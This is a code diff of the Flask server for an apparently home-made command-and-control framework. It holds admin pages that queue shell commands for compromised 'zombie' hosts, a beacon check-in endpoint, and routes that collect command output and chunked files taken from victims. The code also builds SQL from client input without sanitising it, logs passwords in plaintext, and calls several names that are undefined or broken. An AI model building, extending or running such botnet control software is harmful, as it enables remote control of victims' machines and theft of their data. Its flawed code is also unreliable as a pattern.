@@ -1,12 +1,16 @@
-from database.database import Database
 from flask import Flask, render_template, redirect, request, make_response, jsonify, send_from_directory, current_app
 import base64
 from server import ioFiles
 # from os import path, environ, mkdir
-import os 
+from os import environ
 import logging
 from datetime import datetime
 from pathlib import Path
+import multiprocessing
+from time import sleep
+
+from database.database import Database
+
 
 logger = logging.getLogger("server")
 logging.basicConfig(level=logging.DEBUG, handlers=[
@@ -14,8 +18,6 @@ logging.basicConfig(level=logging.DEBUG, handlers=[
                         logging.StreamHandler()
                     ], format="%(asctime)s |%(levelname)s| %(name)s->%(funcName)s => %(message)s    "
                     )
-#print(f"[???] in server/flask.py, name is: {__name__}")
-
 
 flask_log = logging.getLogger('werkzeug')
 flask_log.setLevel(logging.ERROR)
@@ -30,16 +32,21 @@ class Server:
         logger.debug("routes configured")
         self.build_webdirs(base_path)
         logger.debug("web dirs built")
+        self.db = Database()
+        logger.debug("DB initialized")
         # Setup Flask App settings. 
         self.app.config['UPLOAD_FOLDER'] = 'files/post/'
         try:
-            base_path = os.environ['base_path']
+            base_path = environ['base_path']
         except KeyError as e:
             logger.error("[-] Unable to find base_path variable, setting to defualt './'")
             base_path = './'
         # ROOT_PATH is for where the webserver templates live. 
         self.app.config['ROOT_PATH'] = base_path # not sure if this is needed
-        home = os.environ['HOME']
+        home = environ['HOME']
+        scrub = multiprocessing.Process(target=self.scrub_loop, args=(self.db,))
+        scrub.start() # I want this in Server as well.
+        logger.debug("Started scrub")
         # check if web-root exists
 
         # # This is currenlty failing and causing server to not run
@@ -53,15 +60,37 @@ class Server:
         #     logger.debug("Created directory, now setting ROOT_PATH")
         #     self.app.config['ROOT_PATH'] = f"{home}/c2-base"
 
+    def scrub_loop(self, db):
+        """
+        Continuously scrubs database tables in parallel and then recurses.
+        """
+        tables_to_scrub = ["sessions", "zombies", "commands", "data"]
+        processes = []
+
+        for table in tables_to_scrub:
+            process = multiprocessing.Process(target=self.db.scrub_table, args=(table,))
+            processes.append(process)
+            process.start()
+
+        for process in processes:
+            process.join()
+
+        sleep(30)
+        loop = multiprocessing.Process(target=self.scrub_loop, args=(db,))
+        loop.start()
+        loop.join()
+
+
     def config_routes(self):
         """
-            #TODO:
+            # ToDo
 
             # ADMIN PAGES
             - A page to view status of all known zombies -> DONE
             - A page to send instructions to zombies -> DONE
                 - way to kill zombies if needed
-            - A page to view output from zombies (files, screenshots, cmd output, etc)
+                    - remove them from DB
+            - A page to view output from zombies (files, screenshots, cmd output, etc) -> Done but ugly
             - login functionality -> DONE
 
             # ZOMBIE PAGES
@@ -82,49 +111,46 @@ class Server:
         @self.app.route("/",methods=['GET','POST'])
         @self.app.route("/login", methods=['GET','POST'])
         def login():
-            logger.debug(f"Recieved request to /login from {request.remote_addr}")
+            logger.info(f"Recieved {request.method} request to /login from {request.remote_addr}")
             if request.method == "GET":
                 token = request.cookies.get('Session')
                 if token is not None:
                     logger.debug("Found token, attempting to auth")
-                    db = Database()
-                    auth = db.is_authd(token)
+                    auth = self.db.is_authd(token)
                     logger.debug(f"auth is {auth}")
                     if auth:
                         resp = make_response(redirect("/admin/zombies",302))
                         return resp
                     else:
-                        print(f"LOGIN => presented token: {token} wasn't found in DB!")
+                        logger.info(f"presented token: {token} wasn't found in DB!")
                         return render_template("login.html")
                 else:
                     return render_template("login.html")
             elif request.method == "POST":
                 #Needs input validation here to scrub user var for sqli
                 user = request.form['username']
-                db = Database()
-                enc_pass = db.hash(request.form['password'])
-                print(f"LOGIN => user:{user}\npassword:{request.form['password']}\nenc_pass:{enc_pass}")
-                db_user = db.is_user(user)
-                #print(db_user)
+                enc_pass = self.db.hash(request.form['password'])
+                logger.debug(f"user:{user}\npassword:{request.form['password']}\nenc_pass:{enc_pass}")
+                db_user = self.db.is_user(user)
                 if(db_user):
-                    print(f"LOGIN => user:{user} was found!")
+                    logger.debug(f"user:{user} was found!")
                     #check to see if enc_pass is same as admin pass
-                    db_cred = db.get_enc_cred(user)
+                    db_cred = self.db.get_enc_cred(user)
                     if db_cred is not None:
-                        print(f"LOGIN => found db_cred:{db_cred}")
+                        logger.debug(f"found db_cred:{db_cred}")
                         if enc_pass == db_cred:
                             #login successful
                             # - generate and save session token to db
                             # - Send token to client
                             # - redirect to dashboard
-                            sesTok = db.get_token()
-                            print(f"LOGIN => now saving session: {sesTok}")
-                            res = db.create_session(user,sesTok)
+                            sesTok = self.db.get_token()
+                            logger.debug(f"now saving session: {sesTok}")
+                            res = self.db.create_session(user,sesTok)
                             resp = make_response(redirect("/admin/zombies",302))
                             resp.set_cookie('Session', sesTok)
                             return resp
                         else:
-                            print(f"LOGIN => passwords didn't match whats in database!\npassword:{request.form['password']}\nenc:{enc_pass}")
+                            logger.debug(f"passwords didn't match whats in database!\npassword:{request.form['password']}\nenc:{enc_pass}")
                             resp = make_response(redirect("/login",302))
                             return resp
                     else:
@@ -135,7 +161,7 @@ class Server:
                         resp = make_response(redirect("/login",302))
                         return resp
                 else:
-                    print(f"LOGIN => user:{user} not found!")
+                    logger.debug(f"user:{user} not found!")
                     resp = make_response(redirect("/login",302))
                     return resp
             else:
@@ -147,17 +173,17 @@ class Server:
         """
         @self.app.route("/admin/zombies", methods=['GET'])
         def zombies():
+            logger.info(f"Recieved {request.method} request to /admin/zombies from {request.remote_addr}")
             token = request.cookies.get('Session')
             if token is not None:
-                db = Database()
-                auth = db.is_authd(token)
-                print(f"ZOMBIES => auth is {auth}")
+                auth = self.db.is_authd(token)
+                logger.debug(f"auth is {auth}")
                 if auth:
                     #Get a list of all available agents:
-                    zombies = db.get_zombies()
+                    zombies = self.db.get_zombies()
                     return render_template('agents.html', z=zombies)
                 else:
-                    print(f"ZOMBIES => presented token: {token} wasn't found in DB!")
+                    logger.debug(f"presented token {token} wasn't found in DB!")
                     return redirect("/login", 302)
             else:
                 return redirect("/login", 302)
@@ -168,29 +194,28 @@ class Server:
         """
         @self.app.route("/admin/<zombieID>/", methods=['GET','POST'])
         def interact(zombieID):
+            logger.info(f"Recieved {request.method} request to /admin/{zombieID} from {request.remote_addr}")
             if request.method == 'GET':
                 token = request.cookies.get('Session')
                 if token is not None:
-                    db = Database()
-                    auth = db.is_authd(token)
-                    tok_for_zombie = db.get_all_dataTok(zombieID)
+                    auth = self.db.is_authd(token)
+                    tok_for_zombie = self.db.get_all_dataTok(zombieID)
                     zID = zombieID
-                    print(f"[???] inTERACT => auth is {auth}")
+                    logger.debug(f"auth is {auth}")
                     if auth:
                         return render_template('execmd.html',d=tok_for_zombie,z=zID)
                     else:
-                        print(f"[???] inTERACT => presented token: {token} wasn't found in DB!")
+                        logger.debug(f"presented token: {token} wasn't found in DB!")
                         return redirect("/login", 302)
                 else:
                     return redirect("/login", 302)
             elif request.method == 'POST':
                 command = request.form['command']
-                db = Database()
-                db.add_command(command, zombieID)
+                self.db.add_command(command, zombieID)
                 m = "Command Added!"
                 return render_template("execmd.html",message=m,z=zombieID)
             else:
-                print("INTERACT => wrong verb, redirecting")
+                logger.error(f"{request.remote_ip} presented {request.method}, redirecting")
                 return redirect("/login", 302)
             
         """
@@ -198,19 +223,19 @@ class Server:
         """
         @self.app.route("/admin/<zombieID>/<token>",methods=['GET'])
         def zombieData(zombieID,token):
+            logger.info(f"Recieved {request.method} request to /admin/{zombieID}/{token} from {request.remote_addr}")
             if request.method == 'GET':
                 auth_token = request.cookies.get('Session')
                 if auth_token is not None:
-                    db = Database()
-                    auth = db.is_authd(auth_token)
-                    print(f"ZOMBIEDATA => auth is {auth}")
+                    auth = self.db.is_authd(auth_token)
+                    logger.debug(f"auth is {auth}")
                     if auth:
                         #Need to set up file or data and treat each differently
-                        data = db.get_dataBlob(zombieID,token,"data")
-                        print(f"ZOMBIEDATA => Found data:{data}")
+                        data = self.db.get_dataBlob(zombieID,token,"data")
+                        logger.debug(f"Found data:{data}")
                         if data == 'FILE':
                             #render_template with link to file
-                            print(f"ZOMBIEDATA => FILE WAS FOUND: {token}")
+                            logger.debug(f"FILE WAS FOUND: {token}")
                             cmd = "FILE"
                             #output = "LINK_TO_FILE"
                             return render_template('zombieData.html',c=cmd,token=token,z=zombieID)
@@ -218,13 +243,13 @@ class Server:
                             data = base64.b64decode(data.encode('utf-8')).decode('utf-8')
                             cmd = data.split("CMD:")[1]
                             cmd = cmd.split(":OUTPUT:")[0].strip()
-                            print(f"ZOMBIEDATA => cmd: {cmd}")
+                            logger.debug(f"cmd: {cmd}")
                             output = data.split("CMD:")[1].split(":OUTPUT:")[1].strip()
                             output = output.split('\n')
-                            print(f"ZOMBIEDATA => output: {output}")
+                            logger.debug(f"output: {output}")
                             return render_template('zombieData.html',c=cmd,o=output,z=zombieID)
                     else:
-                        print(f"ZOMBIEDATA => presented token: {token} wasn't found in DB!")
+                        logger.debug(f"ZOMBIEDATA => presented token: {token} wasn't found in DB!")
                         return redirect("/login", 302)
                 else:
                     return redirect("/login", 302)
@@ -236,20 +261,20 @@ class Server:
         """
         @self.app.route('/downloads/<filename>', methods=['GET'])
         def download(filename):
+            logger.info(f"Recieved {request.method} request to /downloads/{filename} from {request.remote_addr}")
             if request.method == 'GET':
                 auth_token = request.cookies.get('Session')
                 if auth_token is not None:
-                    db = Database()
-                    auth = db.is_authd(auth_token)
-                    print(f"DOWNLOAD => auth is {auth}")
+                    auth = self.db.is_authd(auth_token)
+                    logger.debug(f"auth is {auth}")
                     if auth:
                         uploads = path.join(self.app.config['ROOT_PATH'], self.app.config['UPLOAD_FOLDER'])
-                        print(f"DOWNLOAD => UPLOADING FROM: {uploads}")
+                        logger.debug(f"UPLOADING FROM: {uploads}")
                         file = f"{filename}"
-                        print(f"DOWNLOAD => file is {uploads}{file}")
+                        print(f"file is {uploads}/{file}")
                         return send_from_directory(uploads, file)
                     else:
-                        print(f"DOWNLOADS => TOKEN: {auth_token} INVALID")
+                        logger.debug(f"TOKEN: {auth_token} INVALID")
                         return redirect("/login", 302)
                 else:
                     return redirect("/login", 302)
@@ -268,18 +293,18 @@ class Server:
         """
         @self.app.route("/checkin", methods=['POST'])                                  
         def checkin():
+            logger.info(f"Recieved {request.method} request to /checkin from {request.remote_addr}")
             content = request.get_json()
             zombieID = content['X-Client-ID']
-            #print(f"CHECKIN => found zombieID: {zombieID}")
+            #logger.debug(f"found zombieID: {zombieID}")
             # Static value to determine how long to sleep, need build a way to set dynamically
             sleepLength = 3
-            db = Database()
-            con = db.get_con(db.name)
-            cur = db.get_cur(con)
+            con = self.db.get_con(self.db.name)
+            cur = self.db.get_cur(con)
             # check here if zombie has command available
             # First check if zombie exists
-            if db.is_zombie(zombieID):
-                print(f"CHECKIN => found zombieID: {zombieID}")
+            if self.db.is_zombie(zombieID):
+                logger.debug(f"found zombieID: {zombieID}")
                 # NEED TO UPDATE SQL STATEMENTS, THIS CODE IS VULNERABLE
                 cmd = f"select zombieID, token from commands where zombieID='{zombieID}'"
                 cur.execute(cmd)
@@ -287,35 +312,35 @@ class Server:
                 #print(f"CHECKIN => results found: {res}")
                 con.close()
                 if res is None:
-                    print(f"CHECKIN => {zombieID}: No Commands available")
+                    logger.debug(f"{zombieID}: No Commands available")
                     body = {"X-Server-Version":f"{sleepLength}"}
                     #resp = make_response("<body><p>OK</p></body>")
-                    db.updateTime("zombies",zombieID)
+                    self.db.updateTime("zombies",zombieID)
                     return jsonify(body)
                 else:
-                    print(f"CHECKIN => {zombieID}: Command FOUND!")
+                    logger.debug(f"{zombieID}: Command FOUND!")
                     token = res[1]
-                    print(f"CHECKIN => Found token: {token}")
+                    logger.debug(f"Found token: {token}")
                     resp = make_response(redirect('/recvFrom',code=302))
                     resp.headers.add("Token",token)
                     resp.headers.add('X-Server-Version', sleepLength)
-                    db.updateTime("zombies",zombieID)
+                    self.db.updateTime("zombies",zombieID)
                     return resp
             elif zombieID is not None:
                 con.close()
                 newHost = zombieID
-                print(f"CHECKIN => now attempting to add host to database")
-                if db.add_zombie(newHost):
-                    print(f"CHECKIN => {newHost}: Added to db!")
+                logger.debug(f"now attempting to add host to database")
+                if self.db.add_zombie(newHost):
+                    logger.debug(f"{newHost}: Added to db!")
                     body = {"X-Server-Version":f"{sleepLength}"}
                     return jsonify(body)
                 else:
-                    print(f"CHECKIN => {newHost}: ERROR, NOT ADDED")
+                    logger.debug(f"{newHost}: ERROR, NOT ADDED")
                     body = {"ERROR":"NOT ADDED"}
                     return jsonify(body), 500     
             else:
                 con.close()
-                print(f"CHECKIN => Could not find zombieID: {zombieID} and 'X-Client-Version' is {request.cookie.get('X-Client-Version')}")
+                logger.debug(f"CCould not find zombieID: {zombieID} and 'X-Client-Version' is {request.cookie.get('X-Client-Version')}")
                 con.close()
                 return make_response("<h1>Info Not Found</h1>", 403)
             
@@ -335,6 +360,7 @@ class Server:
         """
         @self.app.route("/sendto", methods=['POST'])
         def sendto():
+            logger.info(f"Recieved {request.method} request to /sendto from {request.remote_addr}")
             content = request.get_json()
             data = content['data']
             zombieID = content['X-Client-ID']
@@ -345,33 +371,31 @@ class Server:
             #print(f"SENDTO => pageID: {pageID}")
             if pageID is not None:
                 # handle files sent to server
-                print(f"SENDTO => pageID:{pageID}")
+                logger.debug(f"pageID:{pageID}")
                 if pageID == 'END':
                     ioFile = ioFiles.ioFiles(zombieID)
                     if(ioFile.write_chunk(data)):
-                        print("SENDTO => Last data has been written")
+                        logger.debug("Last data has been written")
                     else:
-                        print("SENDTO => ERROR WRITTING DATA")
+                        logger.debug("ERROR WRITTING DATA")
                     body = {"X-Server-Version":"3"}
                     #add worker logic here
                     token = ioFile.process_file(zombieID)
-                    print("SENDTO => Data Files have been processed")
+                    logger.debug("Data Files have been processed")
                     #add database entry with zombieID and 'FILE' for blob
-                    db = Database()
-                    db.add_file(zombieID,token=token)
+                    self.db.add_file(zombieID,token=token)
                     body = {"X-Server-Version":"3"}
                     return jsonify(body) 
                 else:
-                    print("SENDTO => SAVING CHUNK TO FILE")
+                    logger.debug("SAVING CHUNK TO FILE")
                     ioFile = ioFiles.ioFiles(zombieID)
                     ioFile.write_chunk(data)
-                    print("SENDTO => CHUNK SAVED")
+                    logger.debug("CHUNK SAVED")
                     body = {"X-Server-Version":"3"}
                     return jsonify(body)
             else:
                 #no pages, just response data
-                db = Database()
-                db.add_data(data,zombieID)
+                self.db.add_data(data,zombieID)
                 body = {"X-Server-Version":"3"}
                 return jsonify(body)
 
@@ -384,14 +408,14 @@ class Server:
         """
         @self.app.route("/recvFrom")
         def recvFrom():
-            db = Database()
+            logger.info(f"Recieved {request.method} request to /recvFrom from {request.remote_addr}")
             content = request.get_json()
             token = content['Token']
             zombieID = content['X-Client-ID']
-            dataBlob = db.get_dataBlob(zombieID,token,"commands")
+            dataBlob = self.db.get_dataBlob(zombieID,token,"commands")
             if dataBlob is not None:
                 body = {"data":f"{dataBlob}"}
-                db.remove_tok(zombieID,token,"commands")
+                self.db.remove_tok(zombieID,token,"commands")
                 return jsonify(body)
             else:
                 body = {"ERROR":"YOU SHOULDN'T BE HERE"}
@@ -411,10 +435,15 @@ class Server:
                 /post/
                 /stale/
         """
-        base_dir = Path(base_dir)
+        base_dir = Path(base_path)
         if base_dir.is_dir():
             files = base_dir / "files"
-            files.mkdir()
+            try:
+                files.mkdir()
+            except FileExistsError as e:
+                logger.debug("dir 'files' already created, skipping")
+            except Exception as e:
+                logger.error(f"Unable to create directory structure with error {e}")
             for x in ["pre","post","stale"]:
                 try:
                     to_add = files / x
